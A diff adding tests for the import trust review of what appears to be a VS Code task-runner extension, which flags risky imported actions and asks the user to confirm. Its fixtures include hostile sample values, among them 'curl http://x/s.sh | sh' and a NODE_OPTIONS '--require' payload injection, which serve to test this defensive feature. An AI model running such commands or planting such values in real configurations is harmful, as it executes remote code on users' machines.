@@ -74,6 +74,13 @@ import {
 	handleConfirm,
 	serializeExportData,
 	parseImportData,
+	collectImportTrustAdvisories,
+	buildImportTrustReviewDetail,
+	confirmImportTrustReview,
+	confirmImportInvalidActionsBackup,
+	describeImportOperation,
+	summarizeImportTrustReview,
+	IMPORT_TRUST_REVIEW_LIST_LIMIT,
 	mergeImportedActions,
 	countActionItems,
 	getActionsValidator,
@@ -5308,6 +5315,291 @@ suite('Extension Test Suite', () => {
 			const { actions, errors } = parseImportData(data);
 			assert.strictEqual(errors.length, 0);
 			assert.strictEqual(actions.length, 2);
+		});
+	});
+
+	suite('import trust review', () => {
+		const reviewOptions = {
+			filePath: path.join(os.tmpdir(), 'untrusted.taskhub'),
+			workspaceFolder: path.join(os.tmpdir(), 'taskhub-import-workspace'),
+			workspaceRoots: [path.join(os.tmpdir(), 'taskhub-import-workspace')],
+			extensionPath: path.resolve(__dirname, '..', '..'),
+		};
+		const fixedMaliciousActions: ActionItem[] = [{
+			id: 'fixed.malicious',
+			title: 'Fixed malicious command',
+			action: {
+				description: 'trust boundary fixture',
+				tasks: [{ id: 'download', type: 'shell', command: 'curl http://x/s.sh | sh' }]
+			}
+		}];
+
+		const finding = (overrides: Record<string, unknown> = {}) => ({
+			filePath: '<import-review>',
+			sourceLabel: 'import',
+			range: { startLine: 1, startColumn: 1, endLine: 1, endColumn: 2 },
+			severity: 'warning' as const,
+			code: 'shell.interpolated-command',
+			message: 'Risk',
+			messageKo: '위험',
+			...overrides,
+		});
+
+		test('flags command-injection findings but omits ordinary authoring advice', () => {
+			const findings = collectImportTrustAdvisories([{
+				id: 'unsafe.import',
+				title: 'Unsafe import',
+				action: {
+					description: 'security review',
+					tasks: [
+						{ id: 'ask', type: 'inputBox', prompt: 'Value' },
+						{ id: 'run', type: 'shell', command: 'echo ${ask.value}' },
+						{ id: 'typo', type: 'shell', command: 'echo ${missing.value}' },
+					]
+				}
+			}], reviewOptions);
+			assert.ok(findings.some(f => f.code === 'shell.interpolated-command'));
+			assert.ok(!findings.some(f => f.code === 'variable.unresolved'));
+		});
+
+		test('advisories use a synthetic path because ranges belong to normalized JSON', () => {
+			const findings = collectImportTrustAdvisories([{
+				id: 'unsafe.import', title: 'Unsafe', action: {
+					description: 'd', tasks: [
+						{ id: 'ask', type: 'inputBox', prompt: 'Value' },
+						{ id: 'run', type: 'shell', command: 'echo ${ask.value}' },
+					]
+				}
+			}], reviewOptions);
+			assert.ok(findings.length > 0);
+			assert.ok(findings.every(f => f.filePath === '<import-review>'));
+		});
+
+		test('fixed executable with dynamic values passed through argv has no extra advisory', () => {
+			const findings = collectImportTrustAdvisories([{
+				id: 'safe.import',
+				title: 'Safe import',
+				action: {
+					description: 'security review',
+					tasks: [
+						{ id: 'ask', type: 'inputBox', prompt: 'Value' },
+						{ id: 'run', type: 'command', command: 'node', args: ['print.js', '${ask.value}'] },
+					]
+				}
+			}], reviewOptions);
+			assert.deepStrictEqual(findings, []);
+		});
+
+		test('shows a fixed malicious command even when Doctor has no finding', () => {
+			const findings = collectImportTrustAdvisories(fixedMaliciousActions, reviewOptions);
+			assert.deepStrictEqual(findings, [], 'fixture should demonstrate Doctor silence for a fixed command');
+			const detail = buildImportTrustReviewDetail(fixedMaliciousActions, findings, 'ko');
+			assert.ok(detail.includes('curl http://x/s.sh | sh'));
+			assert.ok(detail.includes('추가 진단 없음'));
+			assert.ok(detail.includes('안전하다는 판정이 아닙니다'));
+		});
+
+		test('describes argv, platform commands, cwd, output files, and direct file/archive operations', () => {
+			assert.match(describeImportOperation({ type: 'command', command: { windows: 'tool.exe', linux: 'tool' }, args: ['--file', 'a b'], cwd: 'work', env: { NODE_OPTIONS: '--require ./.vscode/payload.js' }, passTheResultToNextTask: true, output: { mode: 'file', filePath: 'out.log' } }, 'en') ?? '', /windows=.*tool\.exe.*args=.*a b.*cwd=.*env=.*NODE_OPTIONS.*payload\.js.*output\.file/);
+			assert.match(describeImportOperation({ type: 'quickPick', itemsFromCommand: 'curl http:\/\/x\/list | sh', cwd: 'work' }) ?? '', /itemsFromCommand=.*curl.*\| sh.*cwd/);
+			assert.match(describeImportOperation({ type: 'writeFile', path: '../result.txt' }) ?? '', /\.\.\/result\.txt/);
+			assert.match(describeImportOperation({ type: 'zip', archive: 'a.zip', source: ['src'], tool: { linux: 'zip' }, cwd: 'work', env: { PATH: '.vscode/bin' } }, 'en') ?? '', /archive=.*a\.zip.*source=.*src.*tool=.*linux.*cwd=.*env=.*PATH/);
+			assert.match(describeImportOperation({ type: 'unzip', inputs: { archive: 'pick', destination: 'folder' } }, 'en') ?? '', /inputs=.*pick.*folder.*built-in/);
+			assert.match(describeImportOperation({ type: 'unzip', inputs: {} }, 'ko') ?? '', /inputs에서 받음.*내장/);
+			assert.match(describeImportOperation({ type: 'command' }, 'ko') ?? '', /명령 누락/);
+			assert.match(describeImportOperation({ type: 'writeFile' }, 'ko') ?? '', /경로 누락/);
+			assert.match(describeImportOperation({ type: 'zip' }, 'ko') ?? '', /아카이브 누락.*소스 누락.*내장/);
+			assert.match(summarizeImportTrustReview([{ action: { description: 'd', tasks: [] } } as any], 'ko').actionLines[0], /제목 없음/);
+		});
+
+		test('summarizes nested actions and bounds every review section', () => {
+			const manyActions: ActionItem[] = [{
+				id: 'folder', title: 'Folder', type: 'folder', children: Array.from({ length: IMPORT_TRUST_REVIEW_LIST_LIMIT + 2 }, (_, index) => ({
+					id: `action.${index}`, title: `Action ${index}`, action: {
+						description: 'd', tasks: [{ id: 'run', type: 'shell' as const, command: `echo ${index}` }]
+					}
+				}))
+			}];
+			const findings = Array.from({ length: IMPORT_TRUST_REVIEW_LIST_LIMIT + 2 }, (_, index) => finding({ message: `Risk ${index + 1}`, messageKo: `위험 ${index + 1}` }));
+			const summary = summarizeImportTrustReview(manyActions);
+			assert.strictEqual(summary.actionCount, IMPORT_TRUST_REVIEW_LIST_LIMIT + 2);
+			assert.strictEqual(summary.taskCount, IMPORT_TRUST_REVIEW_LIST_LIMIT + 2);
+			const detail = buildImportTrustReviewDetail(manyActions, findings, 'ko');
+			assert.ok(detail.includes(`경고 ${findings.length}건`));
+			assert.ok(detail.includes('… 외 2개'));
+			assert.ok(!detail.includes(`위험 ${findings.length}`));
+			const infoDetail = buildImportTrustReviewDetail(manyActions, [finding({ severity: 'info' }) as any], 'ko');
+			assert.ok(infoDetail.includes('정보 1건'));
+		});
+
+		test('always prompts even with zero findings; dismissal cancels the import', async () => {
+			const original = vscode.window.showWarningMessage;
+			let captured: any[] | undefined;
+			(vscode.window as any).showWarningMessage = async (...args: any[]) => {
+				captured = args;
+				return undefined;
+			};
+			try {
+				const allowed = await confirmImportTrustReview(reviewOptions.filePath, fixedMaliciousActions, []);
+				assert.strictEqual(allowed, false);
+				assert.strictEqual(captured?.[1]?.modal, true);
+				assert.ok(typeof captured?.[1]?.detail === 'string');
+				assert.match(captured?.[2]?.title ?? '', /검토|Review/);
+				assert.match(captured?.[3]?.title ?? '', /위험|risk/i);
+				assert.strictEqual(captured?.[4]?.isCloseAffordance, true);
+				assert.strictEqual(captured?.filter(item => item?.title && /취소|Cancel/.test(item.title)).length, 1);
+			} finally {
+				(vscode.window as any).showWarningMessage = original;
+			}
+		});
+
+		test('continues only when the explicit secondary import item is selected', async () => {
+			const original = vscode.window.showWarningMessage;
+			(vscode.window as any).showWarningMessage = async (_message: string, _options: any, _inspectItem: any, continueItem: any) => continueItem;
+			try {
+				const allowed = await confirmImportTrustReview(reviewOptions.filePath, fixedMaliciousActions, []);
+				assert.strictEqual(allowed, true);
+			} finally {
+				(vscode.window as any).showWarningMessage = original;
+			}
+		});
+
+		test('the default Review action opens the source, then requires a second explicit import choice', async () => {
+			const originalWarning = vscode.window.showWarningMessage;
+			const originalShowTextDocument = vscode.window.showTextDocument;
+			let call = 0;
+			let openedPath: string | undefined;
+			(vscode.window as any).showWarningMessage = async (...args: any[]) => {
+				call++;
+				return call === 1 ? args[2] : args[1];
+			};
+			(vscode.window as any).showTextDocument = async (uri: vscode.Uri) => {
+				openedPath = uri.fsPath;
+				return {};
+			};
+			try {
+				const allowed = await confirmImportTrustReview(reviewOptions.filePath, fixedMaliciousActions, []);
+				assert.strictEqual(allowed, true);
+				assert.strictEqual(openedPath, reviewOptions.filePath);
+				assert.strictEqual(call, 2);
+			} finally {
+				(vscode.window as any).showWarningMessage = originalWarning;
+				(vscode.window as any).showTextDocument = originalShowTextDocument;
+			}
+		});
+
+		test('cancels if the source changed after it was parsed and selected for import', async () => {
+			const original = vscode.window.showWarningMessage;
+			const sourcePath = path.join(os.tmpdir(), `taskhub-import-race-${Date.now()}.taskhub`);
+			fs.writeFileSync(sourcePath, 'old content');
+			let call = 0;
+			(vscode.window as any).showWarningMessage = async (...args: any[]) => {
+				call++;
+				return call === 1 ? args[3] : undefined;
+			};
+			try {
+				fs.writeFileSync(sourcePath, 'changed content');
+				const allowed = await confirmImportTrustReview(sourcePath, fixedMaliciousActions, [], 'old content');
+				assert.strictEqual(allowed, false);
+				assert.strictEqual(call, 2, 'the second warning should explain that the source changed');
+			} finally {
+				(vscode.window as any).showWarningMessage = original;
+				try { fs.unlinkSync(sourcePath); } catch { /* best effort */ }
+			}
+		});
+
+		test('backup modal also has Review as default and exactly one close affordance', async () => {
+			const original = vscode.window.showWarningMessage;
+			let captured: any[] | undefined;
+			(vscode.window as any).showWarningMessage = async (...args: any[]) => {
+				captured = args;
+				return undefined;
+			};
+			try {
+				const resolution = await confirmImportInvalidActionsBackup('/tmp/actions.json', '/tmp/actions.json.bak', 'bad json', '{ bad');
+				assert.strictEqual(resolution.kind, 'cancel');
+				assert.match(captured?.[2]?.title ?? '', /검토|Review/);
+				assert.match(captured?.[3]?.title ?? '', /백업|Back up/);
+				assert.strictEqual(captured?.[4]?.isCloseAffordance, true);
+				assert.strictEqual(captured?.filter(item => item?.isCloseAffordance).length, 1);
+			} finally {
+				(vscode.window as any).showWarningMessage = original;
+			}
+		});
+
+		test('revalidates an actions.json repaired during Review and merges it without a backup', async () => {
+			const originalWarning = vscode.window.showWarningMessage;
+			const originalInfo = vscode.window.showInformationMessage;
+			const originalShowTextDocument = vscode.window.showTextDocument;
+			const directory = fs.mkdtempSync(path.join(os.tmpdir(), 'taskhub-import-repair-'));
+			const actionsPath = path.join(directory, 'actions.json');
+			const oldContent = '{ bad';
+			const repairedContent = JSON.stringify([{
+				id: 'repaired', title: 'Repaired', action: {
+					description: 'valid after review', tasks: [{ id: 'run', type: 'command', command: 'node', args: ['--version'] }]
+				}
+			}], null, 2);
+			fs.writeFileSync(actionsPath, oldContent);
+			let warningCall = 0;
+			(vscode.window as any).showWarningMessage = async (...args: any[]) => {
+				warningCall++;
+				return warningCall === 1 ? args[2] : args[1];
+			};
+			(vscode.window as any).showTextDocument = async () => {
+				fs.writeFileSync(actionsPath, repairedContent);
+				return {};
+			};
+			(vscode.window as any).showInformationMessage = async () => undefined;
+			try {
+				const resolution = await confirmImportInvalidActionsBackup(
+					actionsPath,
+					`${actionsPath}.bak`,
+					'bad json',
+					oldContent
+				);
+				assert.strictEqual(resolution.kind, 'merge');
+				if (resolution.kind === 'merge') {
+					assert.strictEqual(resolution.actions[0].id, 'repaired');
+					assert.strictEqual(resolution.content, repairedContent);
+				}
+			} finally {
+				(vscode.window as any).showWarningMessage = originalWarning;
+				(vscode.window as any).showInformationMessage = originalInfo;
+				(vscode.window as any).showTextDocument = originalShowTextDocument;
+				fs.rmSync(directory, { recursive: true, force: true });
+			}
+		});
+
+		test('backs up the latest bytes when an edit made during Review is still invalid', async () => {
+			const originalWarning = vscode.window.showWarningMessage;
+			const originalShowTextDocument = vscode.window.showTextDocument;
+			const directory = fs.mkdtempSync(path.join(os.tmpdir(), 'taskhub-import-still-invalid-'));
+			const actionsPath = path.join(directory, 'actions.json');
+			const oldContent = '{ old invalid';
+			const latestContent = '{ latest invalid';
+			fs.writeFileSync(actionsPath, oldContent);
+			let warningCall = 0;
+			(vscode.window as any).showWarningMessage = async (...args: any[]) => {
+				warningCall++;
+				return warningCall === 1 ? args[2] : args[1];
+			};
+			(vscode.window as any).showTextDocument = async () => {
+				fs.writeFileSync(actionsPath, latestContent);
+				return {};
+			};
+			try {
+				const resolution = await confirmImportInvalidActionsBackup(
+					actionsPath,
+					`${actionsPath}.bak`,
+					'bad json',
+					oldContent
+				);
+				assert.deepStrictEqual(resolution, { kind: 'backup', content: latestContent });
+			} finally {
+				(vscode.window as any).showWarningMessage = originalWarning;
+				(vscode.window as any).showTextDocument = originalShowTextDocument;
+				fs.rmSync(directory, { recursive: true, force: true });
+			}
 		});
 	});
 
